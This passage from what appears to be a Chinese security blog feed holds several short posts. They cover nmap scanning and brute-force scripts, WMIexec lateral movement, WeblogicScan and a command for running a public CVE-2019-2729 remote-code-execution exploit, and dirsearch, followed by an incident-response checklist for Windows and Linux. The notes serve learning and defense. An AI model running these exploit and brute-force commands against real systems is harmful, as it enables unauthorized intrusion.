半开放扫描，速度快隐蔽性好（不完成TCP连接），能够明确区分端口状态</span><br><span class="line">-sT   TCP 连接扫描，容易产生记录，效率低</span><br><span class="line">-sA   TCP ACK扫描，只设置ACK标志位，区别被过滤与未被过滤的</span><br><span class="line">-sU   UDP 服务扫描，例如DNS/DHCP等，效率低</span><br><span class="line">-sN;-sF;-sX    TCP Null,Fin,Xmas扫描，从RFC挖掘的微妙方法来区分开放关闭端口</span><br><span class="line">-sl   利用僵尸主机上已知IP分段ID序列生成算法来探测目标上开放端口的信息，极端隐蔽</span><br><span class="line">-sO   IP协议扫描，可以确定目标主机支持哪些IP协议，例如TCP/ICMP等</span><br><span class="line"></span><br><span class="line">-T    设置模板级数，在0-5中选择。</span><br><span class="line">      T0、T1用于IDS规避，T2降低了扫描速度以使用更少的带宽和资源。</span><br><span class="line">      默认为T3，未作任何优化。</span><br><span class="line">      T4假设具有合适及可靠的网络从而加速扫描。</span><br><span class="line">      T5假设具有特别快的网络或者愿为速度牺牲准确性</span><br><span class="line">-host-timeout<span class="tag">&lt;<span class="name">time</span>&gt;</span> 放弃低速目标主机，时间单位为毫秒</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">nmap -v  ip   显示详细的扫描过程</span><br><span class="line">nmap -p  ip   扫描指定端口</span><br><span class="line">nmap -A  ip   全面扫描操作系统</span><br><span class="line">nmap -sP ip   进行ping扫描主机存活</span><br><span class="line">nmap -Pn/-P0 ip 禁ping扫描</span><br><span class="line">nmap -sS ip   进行tcp syn扫描 也叫半开放扫描</span><br><span class="line">nmap -sT ip   进行tcp连接扫描 （准确性高）</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line">扫描漏洞</span><br><span class="line">nmap --script\=vuln ip</span><br><span class="line"></span><br><span class="line">提供暴力破解的方式，可对数据库、smb、snmp等进行简单密码的暴力猜解</span><br><span class="line">nmap --script\=brute 192.168.88.131</span><br><span class="line"></span><br><span class="line">利用FTP指定脚本对目标特定FTP协议进行密码爆破</span><br><span class="line">nmap --script\=ftp-brute.nse 192.168.88.131</span><br><span class="line"></span><br><span class="line">利用第三方的数据库或资源，例如进行whoise解析</span><br><span class="line">nmap --script\=external 192.168.88.131</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> MSF </tag>
            
            <tag> Nmap </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMIexec</title>
      <link href="/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/WMIexec/"/>
      <url>/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/WMIexec/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="WMIexec"><a href="#WMIexec" class="headerlink" title="WMIexec"></a>WMIexec</h1><p>横向渗透之wmiexec</p><h2 id="由来："><a href="#由来：" class="headerlink" title="由来："></a>由来：</h2><p>WMI的全名为“Windows Management Instrumentation”（Windows管理规范）</p><h2 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h2><p>可当作与window系统交互的API，最大优势是可以远程访问WMI系统自带，运行在内存中，</p><p>Windows默认不会将WMI的操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性，不留任何痕迹</p><p>利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。</p><p>缺点：⽹络请求较多；需要对⽅开启rpc服务，现实环境中有六七成机器不开</p><p>利用IPC连接，使用wmiexec连接远程主机。通过调用Windows本地API来获取powershell</p><h2 id="psexec与wmiexec区别"><a href="#psexec与wmiexec区别" class="headerlink" title="psexec与wmiexec区别"></a>psexec与wmiexec区别</h2><p>日志是否记录，</p><p>通过调用WMIEXEC来模拟psexec的功能。</p><h2 id="wmiexec流程："><a href="#wmiexec流程：" class="headerlink" title="wmiexec流程："></a>wmiexec流程：</h2><h3 id="wmiexe-vbs流程："><a href="#wmiexe-vbs流程：" class="headerlink" title="wmiexe.vbs流程："></a>wmiexe.vbs流程：</h3><p>先建立一个IPC连接—&gt;建立一个共享文件夹—&gt;</p><p>用于远程读取命令执行的结果—&gt;再把结果输出到结果共享文件—-&gt;</p><p>通过FSO组件访问远程共享文件的结果文件，将结果输出—&gt;</p><p>调用WMI执行命令删除结果文件—&gt;最后WMIexec退出时，删除文件共享。</p><p>​<img src="/assets/wmiexec%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A-20231201092342-7pf79bo.png" alt="wmiexec详细解释">​</p><h3 id="基础命令使用"><a href="#基础命令使用" class="headerlink" title="基础命令使用"></a>基础命令使用</h3><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> MSF </tag>
            
            <tag> VMIexec </tag>
            
            <tag> 横向渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WeblogicScan</title>
      <link href="/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/WeblogicScan/"/>
      <url>/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/WeblogicScan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="WeblogicScan"><a href="#WeblogicScan" class="headerlink" title="WeblogicScan"></a>WeblogicScan</h1><h2 id="Weblogic一键漏洞扫描检测工具"><a href="#Weblogic一键漏洞扫描检测工具" class="headerlink" title="Weblogic一键漏洞扫描检测工具"></a>Weblogic一键漏洞扫描检测工具</h2><ul><li>支持Python3</li><li>修复漏洞检测误报，漏洞检测结果更精确</li><li>添加CVE-2019-2729, CVE-2019-2618漏洞检测</li><li>插件化漏洞扫描组件</li><li>添加彩色打印</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__        __   _     _             _        ____</span><br><span class="line">\ \      / /__| |__ | | ___   __ _(_) ___  / ___|  ___ __ _ _ __</span><br><span class="line"> \ \ /\ / / _ \ &#x27;_ \| |/ _ \ / _` | |/ __| \___ \ / __/ _` | &#x27;_ \</span><br><span class="line">  \ V  V /  __/ |_) | | (_) | (_| | | (__   ___) | (_| (_| | | | |</span><br><span class="line">   \_/\_/ \___|_.__/|_|\___/ \__, |_|\___| |____/ \___\__,_|_| |_|</span><br><span class="line">                             |___/</span><br><span class="line">                             By Tide_RabbitMask | V 1.5</span><br><span class="line"></span><br><span class="line">Welcome To WeblogicScan !!!</span><br><span class="line">Whoami：https://github.com/rabbitmask</span><br><span class="line">usage: WeblogicScan.py [-h] [-u IP] [-p PORT] [-f FILE]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help  show this help message and exit</span><br><span class="line"></span><br><span class="line">Scanner:</span><br><span class="line">  -u IP       target ip</span><br><span class="line">  -p PORT     target port</span><br><span class="line">  -f FILE     target list</span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">kali：</span><br><span class="line">python3 ./weblogicscan.py -u IP -p 7001</span><br></pre></td></tr></table></figure><h2 id="CVE-2019-2729-Exploit工具："><a href="#CVE-2019-2729-Exploit工具：" class="headerlink" title="CVE-2019-2729-Exploit工具："></a>CVE-2019-2729-Exploit工具：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-2729/2725</span><br><span class="line">漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意HTTP请求，</span><br><span class="line">用于获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限</span><br><span class="line"></span><br><span class="line">kali:</span><br><span class="line">git clone https://github.com/ruthlezs/CVE-2019-2729-Exploit</span><br><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.43.80:7001 -c whoami</span><br><span class="line">-----------</span><br><span class="line">-h， --help ： 显示帮助消息并退出</span><br><span class="line">-u TARGET   ： 目标 URL</span><br><span class="line">-c COMMAND  ： 执行命令</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 漏洞扫描 </tag>
            
            <tag> WeblogicScan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WordList</title>
      <link href="/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/WordList/"/>
      <url>/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/WordList/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="WordList"><a href="#WordList" class="headerlink" title="WordList"></a>WordList</h1><h2 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h2><p>终端输入wordlists，可以看到自带字典的具体路径。ls -al 查看&#x2F;usr&#x2F;share&#x2F;wordlists,查看具体路径。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /usr/share/wordlists</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE130236-20240420171038-1jj5htt.png" alt="屏幕截图 2023-10-15 130236">​</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> MSF </tag>
            
            <tag> WordList </tag>
            
            <tag> 字典 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dirsearch</title>
      <link href="/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/dirsearch/"/>
      <url>/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/dirsearch/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>dirsearch 是一个python开发的目录扫描工具。</p><p>和御剑之类的工具类似，用于扫描网站的敏感文件和目录从而找到突破口</p><p>安装：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dirsearch</span><br></pre></td></tr></table></figure><h3 id="dirsearch的使用"><a href="#dirsearch的使用" class="headerlink" title="dirsearch的使用"></a>dirsearch的使用</h3><p>选项说明：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-u指定url</span><br><span class="line">-e  语言指定网站语言，一般用-e*即所有语言</span><br><span class="line">-i保留响应状态码(不同状态码用逗号分隔，可指定范围，如-i 200,300-400)</span><br><span class="line">-x排除响应状态码(不同状态码用逗号分隔，可指定范围，如-x 400,400-500)</span><br><span class="line">-w指定字典（不指定即默认字典）</span><br><span class="line">-r递归目录(即可扫描新扫描出的目录下的目录)二级目录</span><br><span class="line">-random-agents使用随机User-Agent</span><br><span class="line"></span><br><span class="line">--------------------</span><br><span class="line">dirsearch -u URL -e php,java,python -i 200,201-300</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> dirsearch </tag>
            
            <tag> 目录扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应</title>
      <link href="/2024/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A4%84%E7%90%86/"/>
      <url>/2024/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="应急响应处理"><a href="#应急响应处理" class="headerlink" title="应急响应处理"></a>应急响应处理</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p><a href="https://xz.aliyun.com/t/2524">Windows 系统安全事件应急响应 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/fox-yu/p/14380849.html">【应急响应】Windows应急响应入门手册 - fox-yu - 博客园 (cnblogs.com)</a></p><h3 id="一、排查系统账号"><a href="#一、排查系统账号" class="headerlink" title="一、排查系统账号"></a>一、排查系统账号</h3><ul><li>查看是否有新增用户</li><li>查看服务器是否有弱口令</li><li>查看管理员对应键值</li><li>​<code>lusrmgr.msc</code>​ 查看账户变化</li><li>​<code>net user</code>​列出当前登录账户</li><li>​<code>wmic UserAccount get</code>​列出当前系统所有账户</li></ul><h3 id="二、排查可疑端口，进程"><a href="#二、排查可疑端口，进程" class="headerlink" title="二、排查可疑端口，进程"></a>二、排查可疑端口，进程</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano |findstr &quot;3306&quot; 查看是否打开了可疑端口</span><br><span class="line">tasklist | findstr PID       查看是否有可疑进程</span><br><span class="line"></span><br><span class="line">查看可疑的进程及其子进程。可以通过观察以下内容：</span><br><span class="line">-没有签名验证信息的进程</span><br><span class="line">-没有描述信息的进程</span><br><span class="line">-进程的属主</span><br><span class="line">-进程的路径是否合法</span><br><span class="line">-CPU或内存资源占用长时间过高的进程</span><br><span class="line">-可以获取进程关联的文件 MD5 值，然后发送到威胁情报平台上辅助检查。进程关联的文件也可以使用在线病毒检测平台上直接检测。</span><br></pre></td></tr></table></figure><h3 id="三、排查启动项，计划任务，服务"><a href="#三、排查启动项，计划任务，服务" class="headerlink" title="三、排查启动项，计划任务，服务"></a>三、排查启动项，计划任务，服务</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">分析开机自启程序 </span><br><span class="line">注册表中的关于开机启动的位置：</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">(ProfilePath)\Start Menu\Programs\Startup 启动项</span><br><span class="line"></span><br><span class="line">msconfig   启动选项卡</span><br><span class="line">gpedit.msc 组策略编辑器</span><br><span class="line"></span><br><span class="line">查看计划或定时任务</span><br><span class="line">C:\Windows\System32\Tasks\</span><br><span class="line">C:\Windows\SysWOW64\Tasks\</span><br><span class="line">C:\Windows\tasks\</span><br><span class="line">schtasks      查看计划任务</span><br><span class="line">taskschd.msc  计划任务面板</span><br><span class="line">compmgmt.msc  计算机管理面板</span><br><span class="line"></span><br><span class="line">services.msc  查看启动服务</span><br></pre></td></tr></table></figure><h3 id="四、排查系统相关信息"><a href="#四、排查系统相关信息" class="headerlink" title="四、排查系统相关信息"></a>四、排查系统相关信息</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、查看系统版本以及补丁信息 </span><br><span class="line">检查方法:</span><br><span class="line">单击【开始】&gt;【运行】，输入systeminfo，查看系统信息 </span><br><span class="line">2、查找可疑目录及文件 </span><br><span class="line">检查方法:</span><br><span class="line">    a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录： Window 2003 C:\Documents and Settings和Window 2008R2 C:\Users\ </span><br><span class="line">b、单击【开始】&gt;【运行】，输入%UserProfile%\Recent，分析最近打开分析可疑文件。 </span><br><span class="line">c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。 </span><br><span class="line">d、回收站、浏览器下载目录、浏览器历史记录 </span><br><span class="line">    e、修改时间在创建时间之前的为可疑文件 </span><br><span class="line">3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件? </span><br><span class="line">a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。 </span><br><span class="line">b、利用计算机自带文件搜索功能，指定修改时间进行搜索</span><br></pre></td></tr></table></figure><h3 id="五、系统查杀情况"><a href="#五、系统查杀情况" class="headerlink" title="五、系统查杀情况"></a>五、系统查杀情况</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、病毒查杀 </span><br><span class="line">检查方法:</span><br><span class="line">下载安全软件，更新最新病毒库，进行全盘扫描。 </span><br><span class="line">2、webshell查杀 </span><br><span class="line">检查方法:</span><br><span class="line">选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充 规则库 的不足。</span><br></pre></td></tr></table></figure><h3 id="六、日志分析"><a href="#六、日志分析" class="headerlink" title="六、日志分析"></a>六、日志分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、系统日志 </span><br><span class="line">分析方法: </span><br><span class="line">a、前提:开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的 信息等。 </span><br><span class="line">b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。 </span><br><span class="line">c、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。 </span><br><span class="line"></span><br><span class="line">2、WEB访问日志 </span><br><span class="line">分析方法:</span><br><span class="line">    a、找到中间件的web日志，打包到本地方便进行分析。</span><br><span class="line">    b、推荐工具:Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。 Linux下，使用Shell命令组合查询分析 </span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="一、常用命令"><a href="#一、常用命令" class="headerlink" title="一、常用命令"></a>一、常用命令</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">检查命令文件是否被替换：</span><br><span class="line">rpm -Vf /usr/bin/*</span><br><span class="line">rpm -Vf /usr/sbin/*</span><br><span class="line">#rpm -Vf /usr/bin/xxx</span><br><span class="line">#S 关键字代表文件大小发生了变化</span><br><span class="line">#5 关键字代表文件的 md5 值发生了变化</span><br><span class="line">#T 代表文件时间发生了变化</span><br><span class="line"></span><br><span class="line">排查历史命令：hitstory</span><br><span class="line">在 root账户下排查是否有黑客执行的命令</span><br><span class="line">&gt; cd /root</span><br><span class="line">&gt; cat .bash_history</span><br><span class="line"></span><br><span class="line">ifconfig          查看网络转发，也可用于查看网络丢包</span><br><span class="line">top -c            查看进程占用</span><br><span class="line">md5sum filename   可用于判断系统命令是否被修改及查询文件威胁情报</span><br><span class="line">tcpdump           抓包</span><br><span class="line">who               查看当前登录用户</span><br><span class="line">netstat           查看网络连接</span><br><span class="line">ps                查看进程</span><br><span class="line">skill -9 -t user  强制下线用户</span><br></pre></td></tr></table></figure><p>‍</p><h3 id="二、启动项及计划任务"><a href="#二、启动项及计划任务" class="headerlink" title="二、启动项及计划任务"></a>二、启动项及计划任务</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">查看服务器的定时任务：</span><br><span class="line">cd /var/spool/cron</span><br><span class="line">cat root</span><br><span class="line"></span><br><span class="line">/etc/init.d/       查看linux开机启动程序</span><br><span class="line">/etc/xinetd.d      网络守护进程服务，用于启动一些网络程序</span><br><span class="line">查看rc.local文件（/etc/init.d/rc.local  将程序加入开机启动在 /etc/rc.local中的exit 0前加即可）</span><br><span class="line">/etc/rc.d/rc[0~6].d     各个运行级别的脚本文件，基本都是/etc/init.d/下的软链接，ubuntu的启动级别：0关机1单用户2-5　　多用户图形界面6重启</span><br><span class="line">/etc/profile.d/         应用程序所需的启动脚本</span><br><span class="line">计划任务：</span><br><span class="line">crontab -l 列出某个用户cron服务详细内容</span><br><span class="line">crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">crontab -e 使用编辑器编辑当前的crontab文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="三、网络行为"><a href="#三、网络行为" class="headerlink" title="三、网络行为"></a>三、网络行为</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">排查网络连接：netstat -anpto</span><br><span class="line">根据PID好查找程序位置：lsof -p PID</span><br><span class="line"></span><br><span class="line">flsof -i -PnR      查看网络通信情况</span><br><span class="line">iptables -A OUTPUT -d ip -j DROP 屏蔽网络ip</span><br><span class="line">iptables -I INPUT -p tcp --dport 443 -m string --string &quot;x.com&quot; --algo bm -j DROP 用iptables封锁与之通信的域名x.com</span><br><span class="line">cat /etc/services  查看网络服务</span><br><span class="line">cat /etc/hosts     查看hosts是否修改</span><br><span class="line">tcpdump            有时候直接抓包能少走很多弯路</span><br><span class="line">例：客户被通报主机对外发起DDOS攻击，首先想到的是肉鸡，</span><br><span class="line">但排查了半天没结果，后来抓包发现DDOS发出的包为NTP数据包，攻击行为是NTP Reply Flood Attack</span><br></pre></td></tr></table></figure><h3 id="四、文件检查"><a href="#四、文件检查" class="headerlink" title="四、文件检查"></a>四、文件检查</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">查看文件状态：stat shell.elf</span><br><span class="line"></span><br><span class="line">ls -alt          指定目录下文件按照时间排序</span><br><span class="line">stat filename   查看文件信息</span><br><span class="line">touch -t 时间戳 filename</span><br><span class="line"></span><br><span class="line">find / -uid 0 -print 查找特权用户文件，即超级权限用户，如root，UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0</span><br><span class="line">find / -name &quot;username&quot; -prin 查找特定用户名的文件</span><br><span class="line">ls -al /tmp | grep &quot;Feb 27&quot;   根据确定时间去反推变更的文件</span><br><span class="line">find / * .jsp -perm 4777      查找777的权限的文件</span><br><span class="line">find / | xargs grep xxx       查看包含xxx字符串的文件</span><br><span class="line"></span><br><span class="line">敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）</span><br><span class="line"></span><br><span class="line">查找24小时内被修改的JSP文件： find / -mtime 0 -name &quot;*.jsp&quot;</span><br><span class="line">查找72小时内新增的文件：      find / -ctime -2</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="五、账号检查"><a href="#五、账号检查" class="headerlink" title="五、账号检查"></a>五、账号检查</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">排查后门用户：who</span><br><span class="line"></span><br><span class="line">查看特权账户：awk -F: &#x27;$3==0 &#123;print$1&#125;&#x27; /etc/passwd</span><br><span class="line">查看是否存在空口令用户: awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">查询可以远程登录的帐号信息: awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"></span><br><span class="line">查看用户最近登录情况：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure* | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line"></span><br><span class="line">less /etc/passwd   查看是否有新增用户</span><br><span class="line">ls -l /etc/passwd  查看passwd最后修改时间，文件是否在不知情的情况下被修改</span><br><span class="line"></span><br><span class="line">cat /etc/passwd | grep -E“/bin/bash$” 能够登录的帐号</span><br><span class="line">usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line"></span><br><span class="line">last，查看系统的成功登录、关机、重启等情况，数据源为/var/log/wtmp，var/log/btmp</span><br><span 